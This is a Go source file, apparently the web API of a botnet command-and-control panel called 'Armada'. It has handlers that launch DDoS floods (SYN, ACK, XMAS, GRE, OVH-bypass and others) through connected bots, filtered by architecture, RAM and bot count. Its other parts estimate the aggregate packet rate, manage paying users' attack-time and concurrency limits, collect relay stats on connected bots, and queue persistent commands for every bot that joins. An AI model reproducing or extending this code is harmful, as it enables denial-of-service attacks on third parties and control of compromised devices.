		// Layer 3
		{ID: "greip", Name: "GRE IP", Category: "l3", Desc: "GRE-encapsulated IP flood", Options: rawIPOpts},
		{ID: "greeth", Name: "GRE Ethernet", Category: "l3", Desc: "GRE-encapsulated Ethernet flood", Options: rawIPOpts},
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(methods)
}

// handleAPIRunningAttacks returns all globally running attacks
// estimateMethodThroughput returns estimated per-bot PPS and payload bytes for a method
func estimateMethodThroughput(method string) (pps int64, payloadBytes int64) {
	switch method {
	case "syn", "ack", "stomp", "xmas", "usyn", "allflags", "tcpfrag", "ovh", "advsyn":
		return 80000, 40
	case "udpplain":
		return 30000, 1400
	case "gre_ip", "gre_eth":
		return 40000, 512
	default: // udp, vse, dns, std
		return 50000, 512
	}
}

// handleAPIAttackLaunch handles the attack wizard's structured attack request
func handleAPIAttackLaunch(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	sess := getWebSession(r)
	if sess == nil {
		writeJSON(w, http.StatusUnauthorized, map[string]interface{}{"error": "unauthorized"})
		return
	}
	var req struct {
		Method   string            `json:"method"`
		Target   string            `json:"target"`
		Port     string            `json:"port"`
		Duration int               `json:"duration"`
		Options  map[string]string `json:"options"`
		Filters  struct {
			Arch    string `json:"arch"`
			MinRAM  int64  `json:"minRam"`
			MaxBots int    `json:"maxBots"`
		} `json:"filters"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"error": "Invalid JSON"})
		return
	}
	if req.Method == "" || req.Target == "" || req.Duration <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]interface{}{"error": "method, target, and duration required"})
		return
	}
	if req.Port == "" {
		req.Port = "80"
	}
	username := sess.Username
	if username == "" {
		username = "owner"
	}
	// Enforce attack limits from user profile
	users, _ := loadUsersFromFile()
	for _, u := range users {
		if u.Username == username {
			if req.Duration > u.MaxTime && u.MaxTime > 0 {
				writeJSON(w, http.StatusForbidden, map[string]interface{}{"error": fmt.Sprintf("Duration %ds exceeds your max (%ds)", req.Duration, u.MaxTime)})
				return
			}
			running := getUserAttackCount(username)
			if running >= u.Concurrents && u.Concurrents > 0 {
				writeJSON(w, http.StatusForbidden, map[string]interface{}{"error": fmt.Sprintf("Concurrent limit reached (%d/%d)", running, u.Concurrents)})
				return
			}
			break
		}
	}
	cmd := fmt.Sprintf("%s %s %s %d", req.Method, req.Target, req.Port, req.Duration)
	for key, val := range req.Options {
		if val != "" {
			cmd += fmt.Sprintf(" %s=%s", key, val)
		}
	}
	var count int
	if req.Filters.Arch != "" || req.Filters.MinRAM > 0 || req.Filters.MaxBots > 0 {
		count = sendToFilteredBots(cmd, req.Filters.Arch, req.Filters.MinRAM, req.Filters.MaxBots)
	} else {
		sendToBots(cmd)
		count = getBotCount()
	}
	addUserAttack(username, req.Method, req.Target, req.Port, req.Duration)
	PushActivity("command", fmt.Sprintf("attack %s → %s:%s %ds (%d bots)", req.Method, req.Target, req.Port, req.Duration, count))
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"success": true, "botCount": count, "method": req.Method,
		"target": req.Target, "port": req.Port, "duration": req.Duration,
	})
}

func handleAPIRunningAttacks(w http.ResponseWriter, r *http.Request) {
	attacks := getAllRunningAttacks()
	botCount := int64(getBotCount())
	if botCount < 1 {
		botCount = 1
	}

	type attackJSON struct {
		Method    string `json:"method"`
		Target    string `json:"target"`
		Port      string `json:"port"`
		Duration  int    `json:"duration"`
		Elapsed   int    `json:"elapsed"`
		Remaining int    `json:"remaining"`
		Username  string `json:"username"`
		EstPPS    int64  `json:"estPPS"`
		EstBPS    int64  `json:"estBPS"`
	}
	result := make([]attackJSON, 0, len(attacks))
	for _, a := range attacks {
		elapsed := int(time.Since(a.Start).Seconds())
		rem := a.Duration - elapsed
		if rem < 0 {
			rem = 0
		}
		pps, payload := estimateMethodThroughput(a.Method)
		result = append(result, attackJSON{
			Method:    a.Method,
			Target:    a.Target,
			Port:      a.Port,
			Duration:  a.Duration,
			Elapsed:   elapsed,
			Remaining: rem,
			Username:  a.Username,
			EstPPS:    pps * botCount,
			EstBPS:    pps * botCount * payload * 8,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// handleAPIAttackHistory returns or clears the attack history
func handleAPIAttackHistory(w http.ResponseWriter, r *http.Request) {
	if r.Method == "DELETE" {
		attackHistoryLock.Lock()
		attackHistory = nil
		attackHistoryLock.Unlock()
		saveAttackHistory()
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": "Attack history cleared"})
		return
	}
	attackHistoryLock.Lock()
	result := make([]AttackRecord, len(attackHistory))
	copy(result, attackHistory)
	attackHistoryLock.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// ============================================================================
// USERS MANAGEMENT API
// ============================================================================

func loadUsersFromFile() ([]User, error) {
	data, err := os.ReadFile(usersFile)
	if err != nil {
		return nil, err
	}
	var users []User
	if err := json.Unmarshal(data, &users); err != nil {
		return nil, err
	}
	return users, nil
}

func saveUsersToFile(users []User) error {
	data, err := json.MarshalIndent(users, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(usersFile, data, 0600)
}

type apiUserEntry struct {
	Username    string `json:"username"`
	Password    string `json:"password"`
	Expire      string `json:"expire"`
	Level       string `json:"level"`
	Methods     []string `json:"methods"`
	MaxTime     int    `json:"maxtime"`
	Concurrents int    `json:"concurrents"`
	MaxBots     int    `json:"maxbots"`
}

func handleAPIUsers(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		users, err := loadUsersFromFile()
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to load users"})
			return
		}
		entries := make([]apiUserEntry, len(users))
		for i, u := range users {
			entries[i] = apiUserEntry{
				Username:    u.Username,
				Password:    u.Password,
				Expire:      u.Expire.Format("2006-01-02"),
				Level:       u.Level,
				Methods:     u.Methods,
				MaxTime:     u.MaxTime,
				Concurrents: u.Concurrents,
				MaxBots:     u.MaxBots,
			}
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(entries)

	case "POST":
		var req apiUserEntry
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if req.Username == "" || req.Password == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Username and password required"})
			return
		}
		users, err := loadUsersFromFile()
		if err != nil {
			users = []User{}
		}
		for _, u := range users {
			if u.Username == req.Username {
				writeJSON(w, http.StatusConflict, map[string]interface{}{"success": false, "error": "User already exists"})
				return
			}
		}
		expire, err := time.Parse("2006-01-02", req.Expire)
		if err != nil {
			expire = time.Now().AddDate(0, 1, 0)
		}
		newUser := User{
			Username:    req.Username,
			Password:    req.Password,
			Expire:      expire,
			Level:       req.Level,
			Methods:     req.Methods,
			MaxTime:     req.MaxTime,
			Concurrents: req.Concurrents,
			MaxBots:     req.MaxBots,
		}
		if newUser.Level == "" {
			newUser.Level = "Basic"
		}
		if newUser.MaxTime == 0 {
			newUser.MaxTime = 300
		}
		if newUser.Concurrents == 0 {
			newUser.Concurrents = 1
		}
		users = append(users, newUser)
		if err := saveUsersToFile(users); err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to save"})
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	case "PUT":
		var req apiUserEntry
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if req.Username == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Username required"})
			return
		}
		users, err := loadUsersFromFile()
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to load users"})
			return
		}
		found := false
		for i, u := range users {
			if u.Username == req.Username {
				if req.Password != "" {
					users[i].Password = req.Password
				}
				if req.Expire != "" {
					if t, err := time.Parse("2006-01-02", req.Expire); err == nil {
						users[i].Expire = t
					}
				}
				if req.Level != "" {
					users[i].Level = req.Level
				}
				if req.Methods != nil {
					users[i].Methods = req.Methods
				}
				if req.MaxTime > 0 {
					users[i].MaxTime = req.MaxTime
				}
				if req.Concurrents > 0 {
					users[i].Concurrents = req.Concurrents
				}
				users[i].MaxBots = req.MaxBots
				found = true
				break
			}
		}
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "User not found"})
			return
		}
		if err := saveUsersToFile(users); err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to save"})
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	case "DELETE":
		var req struct {
			Username string `json:"username"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if req.Username == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Username required"})
			return
		}
		users, err := loadUsersFromFile()
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to load users"})
			return
		}
		filtered := make([]User, 0, len(users))
		found := false
		for _, u := range users {
			if u.Username == req.Username {
				found = true
				continue
			}
			filtered = append(filtered, u)
		}
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "User not found"})
			return
		}
		if err := saveUsersToFile(filtered); err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]interface{}{"success": false, "error": "Failed to save"})
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleAPIRelays manages relay server configurations (CRUD)
func handleAPIRelays(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		relaysConfigLock.RLock()
		list := relaysConfig
		if list == nil {
			list = []RelayConfig{}
		}
		relaysConfigLock.RUnlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)

	case "POST":
		var relay RelayConfig
		if err := json.NewDecoder(r.Body).Decode(&relay); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if relay.Host == "" || relay.ControlPort == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "host and controlPort required"})
			return
		}
		if relay.SocksPort == "" {
			relay.SocksPort = "1080"
		}
		relay.ID = fmt.Sprintf("%d", time.Now().UnixNano())
		if relay.Name == "" {
			relay.Name = relay.Host + ":" + relay.SocksPort
		}
		relaysConfigLock.Lock()
		relaysConfig = append(relaysConfig, relay)
		relaysConfigLock.Unlock()
		saveRelays()
		PushActivity("relay", fmt.Sprintf("Relay added: %s (%s:%s)", relay.Name, relay.Host, relay.ControlPort))
		writeJSON(w, http.StatusOK, relay)

	case "DELETE":
		id := r.URL.Query().Get("id")
		if id == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "id required"})
			return
		}
		relaysConfigLock.Lock()
		found := false
		for i, relay := range relaysConfig {
			if relay.ID == id {
				relaysConfig = append(relaysConfig[:i], relaysConfig[i+1:]...)
				found = true
				break
			}
		}
		relaysConfigLock.Unlock()
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "Relay not found"})
			return
		}
		saveRelays()
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// ============================================================================
// RELAY API SERVER — clearnet listener for relay phone-home stats
// ============================================================================

func startRelayAPI(port string) error {
	relayAPILock.Lock()
	defer relayAPILock.Unlock()

	if relayAPIListener != nil {
		return fmt.Errorf("relay API already running on port %s", relayAPIPort)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/relay/report", handleRelayReport)

	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		return fmt.Errorf("failed to listen on port %s: %w", port, err)
	}

	relayAPIListener = ln
	relayAPIPort = port

	go func() {
		srv := &http.Server{Handler: mux}
		srv.Serve(ln)
		// When ln is closed, Serve returns
		relayAPILock.Lock()
		relayAPIListener = nil
		relayAPIPort = ""
		relayAPILock.Unlock()
	}()

	logMsg("[RELAY-API] Listening on 0.0.0.0:%s", port)
	PushActivity("relay", fmt.Sprintf("Relay API started on port %s", port))
	return nil
}

func stopRelayAPI() error {
	relayAPILock.Lock()
	defer relayAPILock.Unlock()

	if relayAPIListener == nil {
		return fmt.Errorf("relay API is not running")
	}

	relayAPIListener.Close()
	logMsg("[RELAY-API] Stopped (was on port %s)", relayAPIPort)
	PushActivity("relay", fmt.Sprintf("Relay API stopped (was port %s)", relayAPIPort))
	// listener/port cleared by the goroutine on Serve return
	return nil
}

// handleRelayReport receives POST stats from relays (clearnet, auth via X-Relay-Key)
func handleRelayReport(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		w.Header().Set("Content-Type", "application/json")
		relayStatsLock.RLock()
		n := len(relayStats)
		relayStatsLock.RUnlock()
		fmt.Fprintf(w, `{"status":"ok","relays_reporting":%d}`, n)
		return
	}
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Auth: check X-Relay-Key header against MAGIC_CODE
	key := r.Header.Get("X-Relay-Key")
	if key == "" {
		key = r.URL.Query().Get("key")
	}
	if subtle.ConstantTimeCompare([]byte(key), []byte(MAGIC_CODE)) != 1 {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	var stats RelayStatsEntry
	if err := json.NewDecoder(http.MaxBytesReader(w, r.Body, 8192)).Decode(&stats); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	if stats.Name == "" {
		http.Error(w, "name required", http.StatusBadRequest)
		return
	}

	stats.LastSeen = time.Now()

	relayStatsLock.Lock()
	relayStats[stats.Name] = stats
	relayStatsLock.Unlock()

	logMsg("[RELAY-REPORT] Received stats from '%s': %d bots, %d active sessions", stats.Name, stats.ConnectedBots, stats.ActiveSessions)
	w.WriteHeader(http.StatusOK)
}

// handleAPIRelayAPI manages the relay API server (start/stop/status)
func handleAPIRelayAPI(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		relayAPILock.Lock()
		running := relayAPIListener != nil
		port := relayAPIPort
		relayAPILock.Unlock()
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"running": running,
			"port":    port,
		})

	case "POST":
		var body struct {
			Action string `json:"action"` // "start" or "stop"
			Port   string `json:"port"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}

		switch body.Action {
		case "start":
			port := body.Port
			if port == "" {
				port = "8443"
			}
			// Basic port validation
			for _, ch := range port {
				if ch < '0' || ch > '9' {
					writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid port"})
					return
				}
			}
			if err := startRelayAPI(port); err != nil {
				writeJSON(w, http.StatusConflict, map[string]interface{}{"success": false, "error": err.Error()})
				return
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "port": port})

		case "stop":
			if err := stopRelayAPI(); err != nil {
				writeJSON(w, http.StatusConflict, map[string]interface{}{"success": false, "error": err.Error()})
				return
			}
			writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

		default:
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "action must be 'start' or 'stop'"})
		}

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleAPIRelayStats returns the latest phone-home stats from all relays
func handleAPIRelayStats(w http.ResponseWriter, r *http.Request) {
	relayStatsLock.RLock()
	result := make(map[string]RelayStatsEntry, len(relayStats))
	for k, v := range relayStats {
		result[k] = v
	}
	relayStatsLock.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(result)
}

// handleAPITasks manages persistent on-join tasks (CRUD)
func handleAPITasks(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		activeTasksLock.RLock()
		now := time.Now()
		list := make([]map[string]interface{}, 0, len(activeTasks))
		for _, t := range activeTasks {
			expired := !t.ExpiresAt.IsZero() && now.After(t.ExpiresAt)
			entry := map[string]interface{}{
				"id":        t.ID,
				"command":   t.Command,
				"createdAt": t.CreatedAt.Format(time.RFC3339),
				"runOnce":   t.RunOnce,
				"expired":   expired,
				"executed":  len(t.ExecutedBots),
			}
			if !t.ExpiresAt.IsZero() {
				entry["expiresAt"] = t.ExpiresAt.Format(time.RFC3339)
			}
			list = append(list, entry)
		}
		activeTasksLock.RUnlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)

	case "POST":
		var req struct {
			Command  string `json:"command"`
			Duration int    `json:"duration"` // seconds, 0 = never
			RunOnce  bool   `json:"runOnce"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		req.Command = strings.TrimSpace(req.Command)
		if req.Command == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Command required"})
			return
		}

		task := Task{
			ID:           fmt.Sprintf("%d", time.Now().UnixNano()),
			Command:      req.Command,
			CreatedAt:    time.Now(),
			RunOnce:      req.RunOnce,
			ExecutedBots: make(map[string]bool),
		}
		if req.Duration > 0 {
			task.ExpiresAt = time.Now().Add(time.Duration(req.Duration) * time.Second)
		}

		activeTasksLock.Lock()
		activeTasks = append(activeTasks, task)
		activeTasksLock.Unlock()
		saveTasks()

		PushActivity("task", fmt.Sprintf("Task created: %s (runOnce=%v)", req.Command, req.RunOnce))
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "id": task.ID})

	case "DELETE":
		id := r.URL.Query().Get("id")
		if id == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "id required"})
			return
		}
		activeTasksLock.Lock()
		found := false
		for i, t := range activeTasks {
			if t.ID == id {
				activeTasks = append(activeTasks[:i], activeTasks[i+1:]...)
				found = true
				break
			}
		}
		activeTasksLock.Unlock()
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "Task not found"})
			return
		}
		saveTasks()
		PushActivity("task", "Task removed: "+id)
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleAPIWebhooks manages webhook configurations (GET/POST/DELETE)
func handleAPIWebhooks(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		webhookConfigsLock.RLock()
		list := webhookConfigs
		if list == nil {
			list = []WebhookConfig{}
		}
		webhookConfigsLock.RUnlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)

	case "POST":
		var wh WebhookConfig
		if err := json.NewDecoder(r.Body).Decode(&wh); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if wh.URL == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "URL is required"})
			return
		}
		if len(wh.Events) == 0 {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "At least one event type required"})
			return
		}
		wh.ID = fmt.Sprintf("%d", time.Now().UnixNano())
		if wh.Label == "" {
			wh.Label = "Webhook"
		}

		webhookConfigsLock.Lock()
		webhookConfigs = append(webhookConfigs, wh)
		webhookConfigsLock.Unlock()
		saveWebhooks()

		PushActivity("webhook", fmt.Sprintf("Webhook added: %s (%s)", wh.Label, wh.URL[:min(len(wh.URL), 50)]))
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "id": wh.ID})

	case "PUT":
		var wh WebhookConfig
		if err := json.NewDecoder(r.Body).Decode(&wh); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if wh.ID == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "ID required"})
			return
		}

		webhookConfigsLock.Lock()
		found := false
		for i, existing := range webhookConfigs {
			if existing.ID == wh.ID {
				if wh.URL != "" {
					webhookConfigs[i].URL = wh.URL
				}
				if wh.Events != nil {
					webhookConfigs[i].Events = wh.Events
				}
				if wh.Label != "" {
					webhookConfigs[i].Label = wh.Label
				}
				webhookConfigs[i].Enabled = wh.Enabled
				found = true
				break
			}
		}
		webhookConfigsLock.Unlock()

		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "Webhook not found"})
			return
		}
		saveWebhooks()
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	case "DELETE":
		id := r.URL.Query().Get("id")
		if id == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "id required"})
			return
		}
		webhookConfigsLock.Lock()
		found := false
		for i, wh := range webhookConfigs {
			if wh.ID == id {
				webhookConfigs = append(webhookConfigs[:i], webhookConfigs[i+1:]...)
				found = true
				break
			}
		}
		webhookConfigsLock.Unlock()
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "Webhook not found"})
			return
		}
		saveWebhooks()
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleAPIWebhookTest sends a test message to all enabled webhooks
func handleAPIWebhookTest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// Fire test to all event types so every webhook gets it
	testEvents := []string{"connect", "disconnect", "attack", "scan", "auth_fail", "socks", "command"}
	for _, evt := range testEvents {
		sendWebhook(evt, fmt.Sprintf("[TEST] Armada webhook test for event: %s (%s)", evt, time.Now().Format("15:04:05")))
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "message": "Test sent to all enabled webhooks"})
}

// handleAPITemplates handles CRUD for command templates
func handleAPITemplates(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case "GET":
		cmdTemplatesLock.RLock()
		list := cmdTemplates
		if list == nil {
			list = []CmdTemplate{}
		}
		cmdTemplatesLock.RUnlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(list)

	case "POST":
		var tmpl CmdTemplate
		if err := json.NewDecoder(r.Body).Decode(&tmpl); err != nil {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Invalid JSON"})
			return
		}
		if tmpl.Name == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Name is required"})
			return
		}
		if tmpl.CmdType == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "Command type is required"})
			return
		}
		b := make([]byte, 8)
		rand.Read(b)
		tmpl.ID = hex.EncodeToString(b)
		if tmpl.Args == nil {
			tmpl.Args = make(map[string]string)
		}

		cmdTemplatesLock.Lock()
		cmdTemplates = append(cmdTemplates, tmpl)
		cmdTemplatesLock.Unlock()
		saveCmdTemplates()

		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true, "id": tmpl.ID})

	case "DELETE":
		id := r.URL.Query().Get("id")
		if id == "" {
			writeJSON(w, http.StatusBadRequest, map[string]interface{}{"success": false, "error": "id required"})
			return
		}
		cmdTemplatesLock.Lock()
		found := false
		for i, t := range cmdTemplates {
			if t.ID == id {
				cmdTemplates = append(cmdTemplates[:i], cmdTemplates[i+1:]...)
				found = true
				break
			}
		}
		cmdTemplatesLock.Unlock()
		if !found {
			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "error": "Template not found"})
			return
		}
		saveCmdTemplates()
		writeJSON(w, http.StatusOK, map[string]interface{}{"success": true})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

// handleAPICmdHistory returns the last 50 commands
func handleAPICmdHistory(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	cmdHistoryLock.Lock()
	list := make([]map[string]interface{}, len(cmdHistory))
	copy(list, cmdHistory)
	cmdHistoryLock.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(list)
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ============================================================================
// SSE (SERVER-SENT EVENTS)
// Replaces polling — pushes stats, bot updates, activity in real-time.
// Falls back gracefully: clients retry on disconnect.
// ============================================================================

func broadcastSSE(event, data string) {
	sseClientsLock.RLock()
	defer sseClientsLock.RUnlock()
	for ch := range sseClients {
		select {
		case ch <- SSEEvent{Event: event, Data: data}:
		default:
			// Client too slow, drop event
		}
	}
}

func handleSSE(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "Streaming not supported", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")

	ch := make(chan SSEEvent, 64)

	sseClientsLock.Lock()
	sseClients[ch] = true
	sseClientsLock.Unlock()

	defer func() {
		sseClientsLock.Lock()
		delete(sseClients, ch)
		sseClientsLock.Unlock()
		close(ch)
	}()

	// Send initial full state
	fmt.Fprintf(w, "event: stats\ndata: %s\n\n", buildStatsJSON())

	botConnsLock.RLock()
	bots := make([]apiBotEntry, 0, len(botConnections))
	for _, bc := range botConnections {
		if bc.authenticated {
			bots = append(bots, buildBotEntry(bc))
		}
	}
	botConnsLock.RUnlock()
	if botsJSON, err := json.Marshal(bots); err == nil {
		fmt.Fprintf(w, "event: bots\ndata: %s\n\n", string(botsJSON))
	}

	flusher.Flush()

	// Send keepalive every 15s to prevent proxy timeouts
	keepalive := time.NewTicker(15 * time.Second)
	defer keepalive.Stop()

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case evt := <-ch:
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", evt.Event, evt.Data)
			flusher.Flush()
		case <-keepalive.C:
			fmt.Fprintf(w, ": keepalive\n\n")
			flusher.Flush()
		}
	}
}
